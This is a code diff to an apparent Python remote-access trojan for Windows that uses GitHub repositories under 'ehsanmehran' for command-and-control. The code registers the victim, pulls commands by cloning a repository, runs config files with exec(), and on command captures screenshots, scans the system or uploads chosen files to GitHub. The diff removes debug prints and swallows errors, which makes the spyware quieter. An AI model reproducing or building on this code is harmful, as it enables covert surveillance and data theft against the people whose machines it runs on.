@@ -13,7 +13,7 @@ import win32api
 from github import Github
 
 # _____(end import)_____ #
-TOKEN = 'token'
+TOKEN = 'Token'
 chdir(getcwd())
 # _____(function)_____ #
 try:
@@ -22,7 +22,7 @@ try:
 
 
     def Regiter():
-        token = "token"
+        token = "Token"
         Username = popen("whoami").read().strip()
         newUsername = Username.replace("\\", "-")
         userFolder = path.join(getcwd(), newUsername)
@@ -77,7 +77,6 @@ try:
             UrlUploade = UrlRepo + f"/contents/{file}"
 
             requests.put(UrlUploade, headers=headers, json=params)
-        print("register end")
 
         pass
 
@@ -113,11 +112,8 @@ try:
             exec(data.read(), globals(), locals)
         link1 = locals["link"]
         Username = locals["Username"]
-
-        print(f"{Username} + {link1} send main func ")
         sha = requests.get(f"https://api.github.com/repos/ehsanmehran/{Username}/contents/{name_file_to_site}",
                            headers={"Authorization": f"token {TOKEN}"}).json()["sha"]
-        print(f"https://api.github.com/repos/ehsanmehran/{Username}/contents/{name_file_to_site}")
         content_base64 = base64.b64encode(content.encode()).decode()  # Encode content to Base64
         data = {"content": content_base64, "message": "data", "sha": sha}
         data = json.dumps(data)
@@ -132,10 +128,7 @@ try:
         locals = {}
         with open(file=environ['APPDATA'] + fr"\Microsoft\Windows\Start Menu\Programs\info.txt", mode="r") as data:
             exec(data.read(), globals(), locals)
-        link = locals["link"]
         Username = locals["Username"]
-        print(f"{Username} + {link} send to git func ")
-
         UrlUploade = f"https://api.github.com/repos/ehsanmehran/{Username}/contents/{name_file_to_site}"
         sha = requests.get(UrlUploade, headers={"Authorization": f"token {TOKEN}"}).json()["sha"]
         content_base64 = base64.b64encode(content).decode()
@@ -176,21 +169,18 @@ def main():
         exec(data.read(), globals(), locals)
     link = locals["link"]
     Username = locals["Username"]
+    if path.exists(Username):
+        Rmpydir(Username)
     while connected_to_internet():
         if path.exists(Username):
             Rmpydir(Username)
-            print("folder delete")
-        print("lets clone")
         if not path.exists(Username):
-            print(link)
             git.Git().clone((link))
-            print("clone complete")
         if path.exists(f"{Username}/result_condition.ini"):
             config = {}
             with open(file=f"{Username}/result_condition.ini", mode="r") as f:
                 exec(f.read(), config)
             result_condition = config['result_condition']
-            print(result_condition)
         else:
             sleep(5)
             continue
@@ -215,7 +205,6 @@ def main():
 
 
         elif result_condition == "camera":
-            print("start camera")
             myscreen = pyautogui.screenshot().save('screen.png')
             with open("screen.png", "rb") as image2string:
                 converted_string = base64.b64encode(image2string.read())
@@ -228,9 +217,8 @@ def main():
                                   name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
             remove("screen.png")
             remove("code_image.ini")
+            send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
             Rmpydir(Username)
-            send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
-                                  name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
 
         elif result_condition == "scan_system":
             if not path.exists("path"):
@@ -257,9 +245,9 @@ def main():
                 remove(i)
             send_main_information(TOKEN=TOKEN, content="result_condition = False",
                                   name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
-            Rmpydir(Username)
             send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
                                   name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
+            Rmpydir(Username)
 
         elif result_condition == "send_file":
             if path.exists(fr"{Username}\file_path.ini"):
@@ -280,9 +268,9 @@ def main():
                             send_file_to_git(TOKEN=TOKEN, content=f.read(), name_file_to_site="download_file.ini")
             send_main_information(TOKEN=TOKEN, content="result_condition = False",
                                   name_file_to_site="result_condition.ini")  # send_condition(TOKEN)
-            Rmpydir(Username)
             send_main_information(TOKEN=TOKEN, content=str(datetime.now()),
                                   name_file_to_site="last_visit.ini")  # last_visit(TOKEN)
+            Rmpydir(Username)
             delete = ["file.ini", "file.zip", "file"]
             for i in delete:
                 remove(fr"{i}")
@@ -294,9 +282,10 @@ def main():
                 configTime = {}
                 with open(file=f"{Username}\\time_sleep.ini", mode="r", encoding="utf8") as f:
                     exec(f.read(), configTime)
-                sleep(int(configTime['time']))
-                print("time set")
+                    time = configTime['time']
+
                 Rmpydir(Username)
+                sleep(int(time))
             else:
                 sleep(300)
                 Rmpydir(Username)
@@ -310,10 +299,7 @@ while True:
             main()
         else:
             Regiter()
-            print("lets got for main")
             main()
-    except Exception as e:
-        print("error ")
-        print(e)
+    except:
         sleep(5)
         continue
